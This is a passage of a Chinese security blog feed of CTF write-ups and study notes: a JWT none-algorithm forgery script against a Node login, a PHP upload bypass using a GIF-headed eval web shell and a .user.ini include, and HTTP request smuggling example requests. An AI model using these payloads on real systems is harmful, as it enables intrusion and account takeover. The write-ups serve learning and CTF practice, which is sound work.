punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">}</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">{</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            token<span class="token punctuation">:</span> token        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">'POST /api/login'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> undefined <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">{</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            status        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">'GET /api/flag'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'permission error'</span><span class="token punctuation">,</span> <span class="token string">'permission denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">const</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            flag        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">'GET /api/logout'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            status<span class="token punctuation">:</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>只有admin才能获取flag，但是我们没法注册admin，只能进行JWT伪造，首先思路就是获取secret，但是失败，没有找到泄露，而且不是弱密码，没法爆破，header头也没有其他的利用点，只能从none加密进行，而且题目也提示是库的问题，所以应该是他利用的jwt库有问题，根据上面的总结，显而易见就是JWT空算法。我就不复现了，主要讲一下我在这个题目中遇到的坑。</p><p>首先是为什么要把secret也要置为空，这点我去看了nodejs中jwt的verify函数</p><p><img src="/3987183317/4.png" alt></p><p>可以看到，当从JWT当中获取不到签名，可接受算法的列表为null，并且secret也为nul就会运用空算法。这也就解释了为什么secret为空。但是从上面的可以看到它在运用verify的时候附了一个<code>algorithm</code>这就是我一直疑惑的地方，我仔细对照了下发现了这个题目的一个坑，在verify中options给出的是<code>algorithms</code>在sign中才是<code>algorithm</code>，不知道是故意为之还是写错了，目前只能这么想了。</p><p><img src="/3987183317/6.png" alt></p><p><img src="/3987183317/5.png" alt></p><p>从这到题目总结下空算法实现需要满足的条件：</p><ol><li>算法为none</li><li>可接受算法为null</li><li>secret为null</li><li>版本对</li></ol><p>不知道是只能用于nodejs，还是所有的限制都这样……最后贴一个脚本，这里还有个js的小trick，是js的弱类型，借鉴自<a href="https://www.anquanke.com/post/id/203417#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203417#h2-2</a></p><p><img src="https://s1.ax1x.com/2020/04/20/JMwohF.png" alt></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding=utf-8</span><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">b64urlencode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span> b64urlencode<span class="token punctuation">(</span><span class="token string">"{"</span>typ<span class="token string">":"</span>JWT<span class="token string">","</span>alg<span class="token string">":"</span>none<span class="token string">"}"</span><span class="token punctuation">)</span> <span class="token operator">+</span>       <span class="token string">'.'</span> <span class="token operator">+</span> b64urlencode<span class="token punctuation">(</span><span class="token string">"{"</span>secretid<span class="token string">":"</span><span class="token number">0.1</span><span class="token string">","</span>username<span class="token string">":"</span>admin<span class="token string">","</span>password<span class="token string">":"</span><span class="token number">123456</span><span class="token string">"}"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span></code></pre><h2 id="0x05-思维导图"><a href="#0x05-思维导图" class="headerlink" title="0x05 思维导图"></a>0x05 思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200422143801.png" alt></p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/12005929.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/12005929.html</a></p><p><a href="https://saucer-man.com/information_security/377.html#cl-7" target="_blank" rel="noopener">https://saucer-man.com/information_security/377.html#cl-7</a></p><p><a href="https://xz.aliyun.com/t/6776#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776#toc-12</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuoj每日一题（5）</title>
      <link href="/2259332357.html"/>
      <url>/2259332357.html</url>
      
        <content type="html"><![CDATA[<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>是一道文件上传文件，本来以为是利用.haaccess绕过的，但是发现是nginx服务器而且貌似源码里对于.haaccess也过滤了，只不过是写错了</p><pre><code>&lt;?php// error_reporting(0);$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);if (!file_exists($userdir)) {    mkdir($userdir, 0777, true);}file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);if (isset($_POST[&quot;upload&quot;])) {    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];    if (!$tmp_name) {        die(&quot;filesize too big!&quot;);    }    if (!$name) {        die(&quot;filename cannot be empty!&quot;);    }    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) {        die(&quot;illegal suffix!&quot;);    }    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) {        die(&quot;&amp;lt;? in contents!&quot;);    }    $image_type = exif_imagetype($tmp_name);    if (!$image_type) {        die(&quot;exif_imagetype:not image!&quot;);    }    $upload_file_path = $userdir . &quot;/&quot; . $name;    move_uploaded_file($tmp_name, $upload_file_path);    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;    echo &#39;Your files : &lt;br&gt;&#39;;    var_dump(scandir($userdir));}</code></pre><p>后缀名基本就不用想了，而exif_imagetype的检验也只检验文件开头的幻数伪造就能绕过，主要还是想办法来绕过对于php的检查和<code>&lt;?</code>，搜了下发现还有user.ini和<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>（此方法自php7.0已经废除）这两种姿势</p><p>考点的话主要应该是user.ini的和<code>&lt;?</code>的绕过<br>主要说一下user.ini</p><h2 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h2><p><img src="/2259332357/1.png" alt><br>看官方文档的说明，可以知道这其实是.htaccess的升级，相较于.htaccess，它有着更广的利用面只要有CGI/FastCGI就可以利用，我们发现我们可以通过这个来设置<code>PHP_INI_PERDIR</code>和<code>PHP_INI_USER</code>，但是通过下面这张图也可以看出来<code>PHP_INI_ALL</code>其实我们也可以利用.user.ini来控制<br><img src="/2259332357/2.png" alt><br>剩下的就是找可以利用的属性了，百度了一下，有两个属性可以利用，分别是<code>auto_append_file</code>，<code>auto_prepend_file</code>前者是在php文件的最后用require包含进指定文件（exit后就没用了），后者则是在文件执行前</p><pre><code>语法：auto_prepend_file=文件名auto_append_file=文件名</code></pre><p>其实这里就看出来了，想要利用的话还必须要在当前目录下有一个php文件<br><img src="/2259332357/3.png" alt><br>回到题目，我们上传我们构造的gif小马也可以看到，确实有一个php文件，再就是上传.user.ini了</p><pre><code>//shell.gifGIF89a&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;1&#39;]);&lt;/script&gt;//.user.iniGIF89aauto_prepend_file=shell.gif</code></pre><p>基于这个思路，其实我们也可以利用user.ini在系统里留后门，写的时候有点困，有的地方可能忘了提及，后面的话会总结下文件上传，最近一直再看HTTP请求走私，代码都没怎么看……</p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP请求走私学习笔记</title>
      <link href="/1720115219.html"/>
      <url>/1720115219.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01什么是HTTP请求走私"><a href="#0x01什么是HTTP请求走私" class="headerlink" title="0x01什么是HTTP请求走私"></a>0x01什么是HTTP请求走私</h2><p>我的理解是由于前后端对于请求处理的RFC标准不同而导致的一种可以利用HTTP伪造进行攻击的一种方式。<br>基于此也产生了五种类型的攻击方式，下面的一张图基本就概括了这五种方式<br><img src="/1720115219/1.jpg" alt><br>图片来自<a href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target="_blank" rel="noopener">某位师傅的推特</a><br>下面的图片就很形象的的阐述了HTTP请求走私的危害，可以看到攻击者通过构造恶意请求，由前端的解析使得恶意请求变成了两个请求留在缓存当中，而后续的用户由于TCP复用的原因，又回使用这个通道，而又由于后端解析的原因就会拼接上攻击者留下来的恶意请求，完成攻击。<br><img src="https://zhzhdoai.github.io/2019/10/17/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E4%B8%80/smuggling-http-request-to-back-end-server.svg" alt></p><h2 id="0x02前置知识"><a href="#0x02前置知识" class="headerlink" title="0x02前置知识"></a>0x02前置知识</h2><h3 id="TCP连接复用"><a href="#TCP连接复用" class="headerlink" title="TCP连接复用"></a>TCP连接复用</h3><p>参考<img src="https://blog.51cto.com/gaibianziji/1211940" alt><br>简单概括下，TCP连接复用就是将多个客户端的HTTP请求复用到一个服务器端TCP连接上</p><h3 id="HTTP–-gt-Keep-Alive"><a href="#HTTP–-gt-Keep-Alive" class="headerlink" title="HTTP–&gt;Keep-Alive"></a>HTTP–&gt;Keep-Alive</h3><p>HTTP的Keep-Alive也可以看成是HTTP复用，自HTTP1.1协议开始，默认开启Keep-Alive，会在请求头中加入Connection: Keep-Alive，这代表，当服务器收到这个请求后不会关闭TCP连接，当后面有来自相同目标服务器的HTTP请求时，会复用这个TCP连接，减少资源，而close则表示这次请求完之后就中断TCP连接<br>而HTTP复用和TCP复用最本质的区别在于，HTTP复用是一个客户端的用户多个HTTP请求使用同一个TCP连接，而TCP复用则是多个客户端的多个HTTP请求使用同一个TCP连接</p><h3 id="HTTP–-gt-pipeline"><a href="#HTTP–-gt-pipeline" class="headerlink" title="HTTP–&gt;pipeline"></a>HTTP–&gt;pipeline</h3><p>参考：<a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec8.html#sec8.1.2.2" target="_blank" rel="noopener">https://www.w3.org/Protocols/rfc2616/rfc2616-sec8.html#sec8.1.2.2</a><br>根据文档中8.1.2.2说，pipeline是发送多个请求而不必等待每个响应，然后服务器根据先入先出的规则将请求和响应对应起来，然后再把响应发送给客户端。</p><blockquote><p>现如今，浏览器默认是不启用Pipeline的，但是一般的服务器都提供了对Pipleline的支持。</p></blockquote><p>下面的一张图就可以看出来差别：<br><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191017234109.png" alt></p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>具体参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding</a><br>Transfer-Encoding是为了优化Content-Length而产生的机制，在 HTTP/1.1 中引入，在 HTTP/2 中取消。在MDN中一共提到了5个，分别是chunked，compress，deflate，gzip，identity。而HTTP请求走私涉及的就是chunked。<br>当头部加入了Transfer-Encoding: chunked之后就表示这个报文采用了分块编码，这个时候，报文中的实体需要改为用一系列分块来传输。<br>我们主要看一下他的格式<br><img src="https://user-gold-cdn.xitu.io/2019/9/8/16d10761bd6315da?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt></p><blockquote><p>每一个非空的块都以该块包含数据的字节数（字节数以十六进制表示）开始，跟随一个CRLF （回车及换行），然后是数据本身，最后块CRLF结束。在一些实现中，块大小和CRLF之间填充有白空格（0x20）。<br>最后一块是单行，由块大小（0），一些可选的填充白空格，以及CRLF。最后一块不再包含任何数据，但是可以发送可选的尾部，包括消息头字段。<br>消息最后以CRLF结尾。</p></blockquote><pre><code>POSTT /xxx HTTP/1.1Host: xxxContent-Type: text/plain Transfer-Encoding: chunked4\r\nWiki\r\n5\r\npedia\r\ne\r\n in\r\n\r\nchunks.\r\n0\r\n\r\n</code></pre><p>看陆师傅blog里面的例子：<br>其中，4、5、e、0就是数据的十六进制表示的字节数，然后\r\n表示CRLF下一行则是chunk-data部分同样需要\r\n。</p><h2 id="0x03攻击方式"><a href="#0x03攻击方式" class="headerlink" title="0x03攻击方式"></a>0x03攻击方式</h2><p>再套用一张图<br><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205171057.png" alt><br>这张图中的反向代理就是我上面图中提到到的前端服务器，后面的web服务器则可以看成后端服务器，而HTTP请求走私就是由于两者的解析不同而产生的。</p><blockquote><p>反向代理与后端服务器不会使用 pipeline 技术，甚至也不会去使用 Keep-Alive ，更多时候反向代理采取的措施是重用 TCP 链接，因为对于反向代理与后端服务器来说，反向代理服务器与后端服务器 IP 相对固定，不同用户的请求通过代理服务器与后端服务器建立链接，将这两者之间的 TCP 链接进行重用，也就顺理成章了。</p></blockquote><p>下面两张图分别展示了HTTP代理服务器和后端服务器的通信的流程和走私的流程<br><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132258.png" alt><br><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132605.png" alt></p><p>下面主要介绍下常见的五种HTTP请求走私，在陆师傅的blog里面还有很多其他的思路可能会产生HTTP请求走私，可以去看一下</p><h3 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h3><p>这个并非特指GET请求，所有携带body的请求都可以利用。这种方式是由于前端的代理服务器对于body的GET请求进行了宽松处理，然后传送到后端服务器，但是后端服务器却不解析，这这就使得content-length后的body完成了走私。<br>举个例子：</p><pre><code>GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 44\r\n\r\nGET / secret HTTP/1.1\r\nHost: example.com\r\n\r\n</code></pre><p>到了后端j解析就会解析成两个HTTP请求：</p><pre><code>第一个GET / HTTP/1.1\r\nHost: example.com\r\n第二个GET / secret HTTP/1.1\r\nHost: example.com\r\n</code></pre><p>需要注意的一点就是Content-Length的长度</p><h3 id="CL-CL型"><a href="#CL-CL型" class="headerlink" title="CL-CL型"></a>CL-CL型</h3><p>这个漏洞的成因则是因为，没有严格的遵守RFC7230的规范所导致的，在这个规范当中明确的表明：当服务器收到的请求当中包含两个Content-Length，而且两者的值不相同的时候，需要返回400错误，但是当服务器没能遵守这个规定，前后端分别取用不同的Content-Length做解析的时候就可能会产生请求走私<br><img src="/1720115219/7.png" alt><br>看下面的一个例子：</p><pre><code>POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 8\r\nContent-Length: 7\r\n12345\r\na</code></pre><p>若是前端按照第一个CL做解析，抛弃或忽略第二个，而后端服务器却忽略第一个，解析第二个，就会导致请求走私，使得a停留在缓冲区等待后面的请求进行拼接，同样的a也可以是仍和的内容。</p><h3 id="CL-TE型"><a href="#CL-TE型" class="headerlink" title="CL-TE型"></a>CL-TE型</h3><p>在<a href="https://tools.ietf.org/html/rfc2616#section-4.4" target="_blank" rel="noopener">RFC2616</a>中说明如果同时存在CL和TE，CL则要被忽略。而当前端服务器没遵守这个协议仍然解析的是CL，但是后端的服务器却遵守了这个协议，将CL忽略去解析了TE，就会产生走私<br><img src="/1720115219/8.png" alt><br>举例：</p><pre><code>POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 13Transfer-Encoding: chunked0SMUGGLED</code></pre><p>前端解析用CL解析完这个请求将其发到后端，但是后端利用TE做解析，将其认为是进行了chunked，而0则表示终止，这时候SUGGLED就会被留在缓存当中等待下一次请求<br><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">burp靶场</a><br><img src="/1720115219/9.png" alt></p><h3 id="TE-CL型"><a href="#TE-CL型" class="headerlink" title="TE-CL型"></a>TE-CL型</h3><p>这个和上面的一样只不过是这个类型是前端解析TE而后端解析CL,就不多说了，直接看题目<br>链接：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a><br><img src="/1720115219/10.png" alt><br>前端代理服务器响应Transfer-Encoding，处理以下数据。Transfer-Encoding遇到0\r\n\r\n数据接收停止</p><pre><code>\r\n12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code></pre><p>后端服务器响应Content-Length，处理以下数据，接收4字节数据</p><pre><code>12\r\n</code></pre><h3 id="TE-TE型"><a href="#TE-TE型" class="headerlink" title="TE-TE型"></a>TE-TE型</h3><p>这种情况是前后端都支持Transfer-Encoding标头，乍一看其实是不存在HTTP请求走私的的，但是可以通过某种方式混淆标头来又是其中一台服务器不对其进行处理：<br>常用的方法如：</p><blockquote><p>Transfer-Encoding: xchunked</p></blockquote><blockquote><p>Transfer-Encoding : chunked</p><p>Transfer-Encoding: chunked<br>Transfer-Encoding: x</p><p>Transfer-Encoding:[tab]chunked</p><p>[space]Transfer-Encoding: chunked</p><p>X: X[\n]Transfer-Encoding: chunked</p><dl><dt>Transfer-Encoding</dt><dd>chunked</dd></dl></blockquote><p>靶机：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a><br><img src="/1720115219/11.png" alt><br>可以看到一共有两个Transfer-Encoding，按照先后顺序，前端解析第一个，然后发送给后端，后端解析第二个，但是发现没发解析就会去用CL解析，这时候12后面的数据就成功完成走私</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>主要了解下HTTP请求走私的几种常见攻击方式，这周本地用安全狗搭建了一个换几个测试了下，发现绕waf更多的是基于http协议的一些技术，感觉不能说是请求走私绕过了waf，更多的是利用http层的一些技术，导致产生了http走私，以至于绕过了waf。太懒了，不想写了，感兴趣的可以看参考文章。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://zhengbao.wang/从http协议层面和数据库层面绕过waf/" target="_blank" rel="noopener">https://zhengbao.wang/%E4%BB%8Ehttp%E5%8D%8F%E8%AE%AE%E5%B1%82%E9%9D%A2%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87waf/</a></p><p><a href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Real-World" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Real-World</a></p><p><a href="https://www.freebuf.com/articles/web/194351.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/194351.html</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuoj每日一题（4）</title>
      <link href="/1041680992.html"/>
      <url>/1041680992.html</url>
      
        <content type="html"><![CDATA[<h2 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h2><p>一脸懵逼，看源码<br><img src="/1041680992/1.png" alt><br>直接就出来flag了……</p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuoj每日一题（3）</title>
      <link href="/2747396825.html"/>
      <url>/2747396825.html</url>
      
        <content type="html"><![CDATA[<h2 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h2><p>太简单了……就过滤了空格，然后万能密码就行了，后端应该就是把账号密码放一个语句里了<br><img src="/2747396825/1.png" alt></p><p>没啥好说的，今天多花时间复现漏洞吧……</p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuoj每日一题（2）</title>
      <link href="/461215164.html"/>
      <url>/461215164.html</url>
      
        <content type="html"><![CDATA[<h2 id="Easy-Calc"><a href="#Easy-Calc" class="headerlink" title="Easy Calc"></a>Easy Calc</h2><pre><code>&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt;</code></pre><p>同时还对num做了check要求必须是数字，思路就是绕过数字的限制，然后就是编码绕过字符的限制，本来想找dockfile看一下后端源码的，但是没找到……</p><p>考点：</p><ol><li>php字符串解析特性</li><li>Http请求走私</li><li>编码bypass</li></ol><p>主要学习下php的字符串解析特性和http请求走私</p><h2 id="php字符串解析特性"><a href="#php字符串解析特性" class="headerlink" title="php字符串解析特性"></a>php字符串解析特性</h2><p>在php将传入的字符串解析到<code>$_GET</code>,<code>$_POST</code>内置数组的时候会对字符串，做一些解析，会将某些字符去掉或用下划线替代。感觉这个解析问题应该出在parse_str身上，而在字符串到<code>$_GET、$_POST</code>的中间做了一次parse_str处理。<br>用脚本跑了下，可以发现，加了一些字符之后仍然会等同于foo_bar<br><img 